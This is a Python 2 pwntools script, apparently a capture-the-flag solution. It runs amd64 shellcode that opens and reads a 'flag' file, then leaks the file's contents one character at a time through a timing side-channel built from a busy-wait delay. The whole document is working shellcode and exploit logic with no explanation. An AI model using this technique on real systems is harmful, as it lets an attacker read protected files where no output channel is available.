#!/usr/bin/env python

from pwn import *
import string
import time

context.log_level = 'error'

u = make_unpacker(64, endian='little', sign='unsigned')
filename = hex(u('.///flag'))
flag = ""
pos = -1
lastchar = 0

while (lastchar < len(string.printable)):
        for i in string.printable:
                start = time.time()
                shellcode = '''
        xor rax, rax 
        xor rdi, rdi 
        push rdi 
        mov rdi, %s
        push rdi 
        mov rdi, rsp                     
        xor rsi, rsi                    
        xor rdx, rdx                    
        mov al, 2
        syscall
        mov rdi, rax                    
        lea rsi, [rsp+8]                
        or rdx, 0xf
        xor rax, rax                    
        syscall
        xor rdx, rdx
        mov rdx, %s                  
        mov al, byte [rsi+%s]
        cmp rax, rdx
        jnz exit
        xor r11, r11
        mov r11, 0
delay:
        inc r11
        cmp r11, 0x7fffffff
        jb delay
exit:
        xor rdi, rdi
        mov al, 60                    
        syscall
'''%(filename,hex(ord(i)),str(pos))
                lastchar += 1
                p = run_assembly(shellcode, arch="amd64")
                p.wait_for_close()
                end = time.time()
                if ((end - start) > 0.5):
                        pos += 1
                        lastchar = 0
                        print "Found: %s"%i
                        flag = "%s%s"%(flag,i)

print "[*] String: %s"%flag
